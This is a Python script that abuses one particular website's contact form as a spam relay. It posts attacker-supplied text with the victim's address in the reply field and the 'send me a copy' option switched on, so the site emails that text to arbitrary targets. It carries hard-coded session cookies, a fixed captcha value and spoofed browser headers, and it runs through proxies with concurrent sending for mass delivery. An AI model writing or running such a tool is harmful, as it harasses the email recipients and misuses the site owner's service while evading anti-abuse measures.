from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': 'ugjjihl6krpgc2tjg9bvp9v1m3',
    '_ga': 'GA1.2.649155251.1677078315',
    '_gid': 'GA1.2.1399551129.1677078315',
    '_gat': '1',
}

headers = {
    'authority': 'www.alisonholt.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'PHPSESSID=ugjjihl6krpgc2tjg9bvp9v1m3; _ga=GA1.2.649155251.1677078315; _gid=GA1.2.1399551129.1677078315; _gat=1',
    'origin': 'https://www.alisonholt.com',
    'referer': 'https://www.alisonholt.com/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'emailtext': self.get_text(),
            'replyemail': target,
            'copy4me': 'yes',
            'capip': '67960',
            'mode': 'sendit',
            'submit': 'send my message',
        }

        response = requests.post('https://www.alisonholt.com/contact.php', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies())

        return response


def main():
    s = 'Your message has been e-mailed to Alison'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
